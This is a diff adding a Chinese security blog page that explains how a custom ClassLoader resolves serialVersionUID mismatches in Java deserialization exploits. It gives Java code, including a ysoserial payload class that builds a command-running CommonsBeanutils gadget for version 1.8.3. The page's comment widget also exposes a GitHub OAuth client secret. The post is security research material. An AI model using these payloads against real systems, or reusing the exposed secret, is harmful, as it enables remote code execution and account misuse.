@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x01 背景serialVesionUid不一致导致反序列化失败也算是Java反序列化漏洞利用比较常见的问题了。查了下资料，发现了各种各样的方法，但没有找到一种适合所有gadget的通用解决方案，为此我花了一些时间，算是找到了自己心中比较完美的解决方案：自定义ClassLoader。目前已经将其集成到ysoserial中，可完美解决各类gadget serialVesionUID不一致问题。 0">
+<meta name="keywords" content="网络安全,渗透测试,代码审计,漏洞艺术,漏洞挖掘,漏洞复现,漏洞利用,漏洞修复">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用自定义ClassLoader解决反序列化serialVesionUID不一致问题">
+<meta property="og:url" content="http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/index.html">
+<meta property="og:site_name" content="回忆飘如雪">
+<meta property="og:description" content="0x01 背景serialVesionUid不一致导致反序列化失败也算是Java反序列化漏洞利用比较常见的问题了。查了下资料，发现了各种各样的方法，但没有找到一种适合所有gadget的通用解决方案，为此我花了一些时间，算是找到了自己心中比较完美的解决方案：自定义ClassLoader。目前已经将其集成到ysoserial中，可完美解决各类gadget serialVesionUID不一致问题。 0">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/add-svuid-by-javassist.png">
+<meta property="og:image" content="http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/modify-svuid-by-hook-getserialversionuid.png">
+<meta property="og:image" content="http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/custom-classloader.png">
+<meta property="og:image" content="http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/commons-beanutils-ser.png">
+<meta property="og:updated_time" content="2020-07-09T18:11:03.480Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="使用自定义ClassLoader解决反序列化serialVesionUID不一致问题">
+<meta name="twitter:description" content="0x01 背景serialVesionUid不一致导致反序列化失败也算是Java反序列化漏洞利用比较常见的问题了。查了下资料，发现了各种各样的方法，但没有找到一种适合所有gadget的通用解决方案，为此我花了一些时间，算是找到了自己心中比较完美的解决方案：自定义ClassLoader。目前已经将其集成到ysoserial中，可完美解决各类gadget serialVesionUID不一致问题。 0">
+<meta name="twitter:image" content="http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/add-svuid-by-javassist.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>
+		
+			使用自定义ClassLoader解决反序列化serialVesionUID不一致问题 | 回忆飘如雪
+		
+	</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/gossip/">闲言碎语</a></li>
+         
+          <li><a href="/links/">左邻右舍</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&text=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&title=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&is_video=false&description=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题&body=Check out this article: http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&title=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&title=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&title=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&title=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/&name=使用自定义ClassLoader解决反序列化serialVesionUID不一致问题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-背景"><span class="toc-number">1.</span> <span class="toc-text">0x01 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-各方案的优劣"><span class="toc-number">2.</span> <span class="toc-text">0x02 各方案的优劣</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-自定义ClassLoader解决方案"><span class="toc-number">3.</span> <span class="toc-text">0x03 自定义ClassLoader解决方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-addClass-amp-amp-addJar"><span class="toc-number">4.</span> <span class="toc-text">0x04 addClass &amp;&amp; addJar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-改双亲委派为自定义ClassLoader优先"><span class="toc-number">5.</span> <span class="toc-text">0x05 改双亲委派为自定义ClassLoader优先</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-编写版本兼容gadget"><span class="toc-number">6.</span> <span class="toc-text">0x06 编写版本兼容gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-参考文章"><span class="toc-number">7.</span> <span class="toc-text">0x07 参考文章</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        使用自定义ClassLoader解决反序列化serialVesionUID不一致问题
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">c0ny1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-08T04:57:57.000Z" itemprop="datePublished">2020-07-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/安全开发/">安全开发</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p><code>serialVesionUid</code>不一致导致反序列化失败也算是Java反序列化漏洞利用比较常见的问题了。查了下资料，发现了各种各样的方法，但没有找到一种适合所有gadget的通用解决方案，为此我花了一些时间，算是找到了自己心中比较完美的解决方案：自定义ClassLoader。目前已经将其集成到ysoserial中，可完美解决各类gadget serialVesionUID不一致问题。</p>
+<h2 id="0x02-各方案的优劣"><a href="#0x02-各方案的优劣" class="headerlink" title="0x02 各方案的优劣"></a>0x02 各方案的优劣</h2><p>在解决这个问题之前，我尝试的很多方法，简单说下它们各自能解决的问题和存在的缺陷。</p>
+<p><strong>方案1:修改序列化byte数据</strong></p>
+<p>该方法可解决序列化最终数据的serialVesionUID不一致，但无法解决Object的serialVesionUID不一致</p>
+<p><strong>方案2:反射修改serialVesionUID</strong></p>
+<p>可以解决1的缺陷，但无法解决Gadget依赖的class没有serialVesionUID属性的情况，因为反射只能修改Object的属性，不能添加。</p>
+<p><strong>方案3:修改Class字节码，添加或修改serialVesionUID</strong></p>
+<p>能解决Gadget直接依赖Class的serialVesionUID不一致问题，可弥补方案2的缺陷。但不好解决Gadget间接依赖class存在serialVesionUID不一致的情况。</p>
+<p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/add-svuid-by-javassist.png" alt="通过javassist给class添加serialVesionUID"></p>
+<p><strong>方案4:Hook ObjectStreamClass.getSerialVesionUID()</strong></p>
+<p>该方法负责返回所有参与序列化Class的serialVesionUID，Hook它并修改返回值，可解决所有class的serialVesionUID不一致问题。但它无法解决Gadget依赖jar版本之间，class差异较大，属性类型不同的情况。因为serialVesionUID发生改变取决于两个因素：Class的属性和方法。如果属性类型改变了，单单只修改serialVesionUID是不够的。</p>
+<p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/modify-svuid-by-hook-getserialversionuid.png" alt="Hook ObjectStreamClass.getSerialVesionUID()"></p>
+<p><strong>方案5:URLClassLoader</strong></p>
+<p>使用URLClassLoader动态引入依赖jar可以很好的解决以上方案的缺陷。只是用在该场景下有些费劲，原因有三：</p>
+<blockquote>
+<p>第一，不方便隔离依赖。包含serialVesionUID不一致class的jar（这里简称<code>不一致jar</code>）是需要被隔离的。由于URLClassLoader是双亲委派模式，存在被父ClassLoader中的同名Class覆盖的风险。</p>
+</blockquote>
+<blockquote>
+<p>第二，不方便共享依赖。Gadget依赖的部分jar可能不存在serialVesionUID不一致问题（这里简称<code>可共用jar</code>），我们需要共享。</p>
+</blockquote>
+<blockquote>
+<p>第三，不方便添加Class到ClassLoader中，URLClassLoader只提供添加jar的方法。</p>
+</blockquote>
+<h2 id="0x03-自定义ClassLoader解决方案"><a href="#0x03-自定义ClassLoader解决方案" class="headerlink" title="0x03 自定义ClassLoader解决方案"></a>0x03 自定义ClassLoader解决方案</h2><p>在我看来比较完美的方案不仅要解决以上方案的缺陷，还要能防止各种未知的”副作用”。使用ClassLoader来解决的思路肯定是没错,但我们需要结合解决serialVesionUID不一致问题这个场景量身设计一个ClassLoader，核心有两点：</p>
+<ol>
+<li>改双亲委派为当前ClassLoader优先，方便隔离不一致jar共享可共用jar</li>
+<li>方便添加Class和Jar到ClassLoader中</li>
+</ol>
+<p><strong>那么自定义ClassLoader是如何解决serialVesionUID不一致问题的呢？</strong></p>
+<p>自定义ClassLoader可以很方便地切换<code>不一致jar</code>为漏洞环境的对应版本，生成的发序列化数据自然不会存在serialVesionUID不一致问题。具体实现如下图，我们自定义ClassLoader包含了Gadget class和不一致jar。当Gadget class实例化生成序列化对象时，由于当前ClassLoader优先原则，存在不一致问题的class使用的是自定义ClassLoader加载的，实现隔离。而其他Class找不到，自然走双亲委派模式，去父ClassLoader中查找，实现共享。</p>
+<p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/custom-classloader.png" alt="自定义ClassLoader示意图"></p>
+<p>下面我们分别来实现。</p>
+<h2 id="0x04-addClass-amp-amp-addJar"><a href="#0x04-addClass-amp-amp-addJar" class="headerlink" title="0x04 addClass &amp;&amp; addJar"></a>0x04 addClass &amp;&amp; addJar</h2><p>首先我们自定义的ClassLoader需要维护要一个装载Class的Map <code>classByteMap</code>,<code>类名</code>为<code>键</code>，<code>类文件byte数据</code>为<code>值</code>。方便后续添加和获取Class。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;String, <span class="keyword">byte</span>[]&gt; classByteMap = <span class="keyword">new</span> HashMap&lt;String,<span class="keyword">byte</span>[]&gt;();</span><br></pre></td></tr></table></figure>
+
+<p>addClass方法，主要是为了方便我们我们把Gadget对应的class添加的自定义ClassLoader中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addClass</span><span class="params">(String className,<span class="keyword">byte</span>[] classByte)</span></span>&#123;</span><br><span class="line">    classByteMap.put(className,classByte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>addJar方法，主要是为了方便把gadget的不一致jar快速添加到ClassLoader中。具体来说就是读取不一致jar中所有class的<code>class name</code>和<code>class byte</code>，存储到<code>classByteMap</code>中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readJar</span><span class="params">(JarFile jar)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    Enumeration&lt;JarEntry&gt; en = jar.entries();</span><br><span class="line">    <span class="comment">// 遍历jar文件所有实体</span></span><br><span class="line">    <span class="keyword">while</span> (en.hasMoreElements())&#123;</span><br><span class="line">        JarEntry je = en.nextElement();</span><br><span class="line">        String name = je.getName();</span><br><span class="line">        <span class="comment">// 只class文件进行处理</span></span><br><span class="line">        <span class="keyword">if</span> (name.endsWith(<span class="string">".class"</span>))&#123;</span><br><span class="line">            String clss = name.replace(<span class="string">".class"</span>, <span class="string">""</span>).replaceAll(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>.findLoadedClass(clss) != <span class="keyword">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">// 读取class的byte内容</span></span><br><span class="line">            InputStream input = jar.getInputStream(je);</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span> bufferSize = <span class="number">4096</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[bufferSize];</span><br><span class="line">            <span class="keyword">int</span> bytesNumRead = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ((bytesNumRead = input.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, bytesNumRead);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] cc = baos.toByteArray();</span><br><span class="line">            input.close();</span><br><span class="line">            <span class="comment">// 将class name 和class byte存储到classByteMap</span></span><br><span class="line">            classByteMap.put(clss, cc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-改双亲委派为自定义ClassLoader优先"><a href="#0x05-改双亲委派为自定义ClassLoader优先" class="headerlink" title="0x05 改双亲委派为自定义ClassLoader优先"></a>0x05 改双亲委派为自定义ClassLoader优先</h2><p>要想打破双亲委派，我们需要重新loadClass方法,修改加载逻辑为优先使用自定义ClassLoader加载。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// 1. 检测自定ClassLoader缓存中有没有，有的话直接返回</span></span><br><span class="line">        Class clazz = cacheClass.get(name);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> != clazz) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 2. 若缓存中没有，就从当前ClassLoader可加载的所有Class中找</span></span><br><span class="line">            clazz = findClass(name);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">null</span> != clazz) &#123;</span><br><span class="line">                cacheClass.put(name, clazz);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                clazz = <span class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="comment">// 3.当自定义ClassLoader中没有找到目标class，再调用系统默认的加载机制,走双亲委派模式</span></span><br><span class="line">            clazz = <span class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>findClass方法定义的是自定义ClassLoader查找Class的逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">    <span class="comment">// 从classByteMap中获取</span></span><br><span class="line">    <span class="keyword">byte</span>[] result = classByteMap.get(name);</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="comment">// 没有找到则抛出对应异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 将一个字节数组转为Class对象</span></span><br><span class="line">        <span class="keyword">return</span> defineClass(name, result, <span class="number">0</span>, result.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-编写版本兼容gadget"><a href="#0x06-编写版本兼容gadget" class="headerlink" title="0x06 编写版本兼容gadget"></a>0x06 编写版本兼容gadget</h2><p>依然以ysoserial <code>CommonsBeanutils1</code>为例子。ysoserial中默认commons-beanutils是1.9.2版本，下面我们给它添加一个兼容1.8.3版本的<code>CommonsBeanutils1_183</code>。</p>
+<p>通过对比1.9.2和1.8.3序列化数据，发现serialVesionUID不一致的只有<code>org.apache.commons.beanutils.BeanComparator</code>类，它在<code>commons-beanutils-&lt;version&gt;.jar</code>中，剩余的<code>commons-collections-3.1.jar</code>和<code>commons-logging-1.2.jar</code>为可共用jar。</p>
+<p><img src="/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/commons-beanutils-ser.png" alt="两个版本的依赖jar生成的序列化数据对比"></p>
+<p>接着就可以编写代码，调用自定义ClassLoader SuidClassLoader来解决serialVesionUID不一致问题了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Dependencies</span>(&#123;<span class="string">"commons-beanutils:commons-beanutils:1.8.3"</span>, <span class="string">"commons-collections:commons-collections:3.1"</span>, <span class="string">"commons-logging:commons-logging:1.2"</span>&#125;)</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.FROHOFF,Authors.CONY1 &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsBeanutils1_183</span> <span class="keyword">extends</span> <span class="title">Object</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义ClassLoader对象</span></span><br><span class="line">        SuidClassLoader suidClassLoader = <span class="keyword">new</span> SuidClassLoader();</span><br><span class="line">        <span class="comment">// 将Gadget class添加到自定义ClassLoader中</span></span><br><span class="line">        suidClassLoader.addClass(CommonsBeanutils1.class.getName(),classAsBytes(CommonsBeanutils1.class));</span><br><span class="line">        <span class="comment">// 从资源目录读取commons-beanutils-1.8.3.jar的base64数据</span></span><br><span class="line">        InputStream is = CommonsBeanutils1_183.class.getClassLoader().getResourceAsStream(<span class="string">"commons-beanutils-1.8.3.txt"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] jarBytes = <span class="keyword">new</span> BASE64Decoder().decodeBuffer(CommonUtil.readStringFromInputStream(is));</span><br><span class="line">        <span class="comment">// 将Gadget不一致jar添加到自定义ClassLoader中</span></span><br><span class="line">        suidClassLoader.addJar(jarBytes);</span><br><span class="line">        Class clsGadget = suidClassLoader.loadClass(<span class="string">"ysoserial.payloads.CommonsBeanutils1"</span>);</span><br><span class="line">        <span class="comment">// 判断存在serialVesionUID不一致问题的class是否是由自定义ClassLoader加载的</span></span><br><span class="line">        <span class="keyword">if</span>(BeanComparator.class.getClassLoader().equals(suidClassLoader))&#123;</span><br><span class="line">            <span class="comment">// 使用自定义ClassLoader加载的Gadget class创建对象，调用其getObject构建序列化对象</span></span><br><span class="line">            Object objGadget = clsGadget.newInstance();</span><br><span class="line">            Method getObject = objGadget.getClass().getDeclaredMethod(<span class="string">"getObject"</span>,String.class);</span><br><span class="line">            Object objPayload = getObject.invoke(objGadget,command);</span><br><span class="line">            suidClassLoader.cleanLoader();</span><br><span class="line">            <span class="keyword">return</span> objPayload;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"Class is not SuidClassLoader loading, serialization failure!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(CommonsBeanutils1_183.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Weblogic coherence.jar的gadget可如法炮制。后续会将完整的代码上传到github项目<a href="http://github.com/woodpecker-framework/ysoserial-woodpecker.git" target="_blank" rel="noopener">ysoserial-woodpecker</a></p>
+<h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul>
+<li><a href="https://www.cnblogs.com/duanxz/p/3511695.html" target="_blank" rel="noopener">java类中serialversionuid 作用 是什么?举个例子说明</a></li>
+<li><a href="https://www.cnblogs.com/wxd0108/p/6681618.html" target="_blank" rel="noopener">Java自定义类加载器与双亲委派模型</a></li>
+<li><a href="https://rhinosecuritylabs.com/research/java-deserializationusing-ysoserial/" target="_blank" rel="noopener">Java Deserialization Exploitation With Customized Ysoserial Payloads</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+
+
+
+    <link rel="stylesheet" href="/css/vssue.min.css">
+<div id="vssue"></div>
+<script src="https://unpkg.com/vue/dist/vue.runtime.min.js"></script>
+<script src="https://unpkg.com/vssue/dist/vssue.github.min.js"></script>
+<!-- <script src="https://unpkg.com/vssue/dist/vssue.github-v4.min.js"></script> -->
+<script>
+    new Vue({
+      el: '#vssue',
+      render: h => h('Vssue', {
+        props: {
+          title: document.title,
+          options: {
+            owner: 'ws4',
+            repo: 'ws4.github.io',
+            clientId: 'e47c5d37e969e470f60b',
+            clientSecret: '82b90182f62c79794f62979f6841b4199281b01d',
+          },
+        }
+      })
+    })
+</script>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/gossip/">闲言碎语</a></li>
+         
+          <li><a href="/links/">左邻右舍</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
